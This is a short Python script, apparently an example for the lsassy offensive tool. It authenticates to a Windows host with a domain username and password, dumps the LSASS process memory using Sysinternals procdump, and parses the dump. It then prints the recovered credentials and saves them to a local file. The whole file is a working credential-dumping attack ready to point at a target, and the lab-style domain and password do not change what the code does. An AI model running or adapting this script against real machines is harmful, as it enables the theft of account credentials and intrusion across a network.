# Author:
#  Romain Bentz (pixis - @hackanddo)
# Website:
#  https://beta.hackndo.com

from lsassy.core import Lsassy
from lsassy.modules.logger import Logger
from lsassy.modules.dumper import Dumper
from lsassy.modules.parser import Parser
from lsassy.modules.writer import Writer

log_options = Logger.Options(verbosity=2, quiet=False)
dump_options = Dumper.Options(method=2, dumpname="lsass.dmp", procdump="/opt/Sysinternals/procdump.exe")
parse_options = Parser.Options(raw=True)
write_option = Writer.Options(format="pretty", output_file="/tmp/credentials.txt")

lsassy = Lsassy(
    hostname="192.168.1.122",
    username="jsnow",
    domain="adsec.local",
    password="Winter_is_coming_!",
    log_options=log_options,
    dump_options=dump_options,
    parse_options=parse_options,
    write_options=write_option
)
print(lsassy.get_credentials())
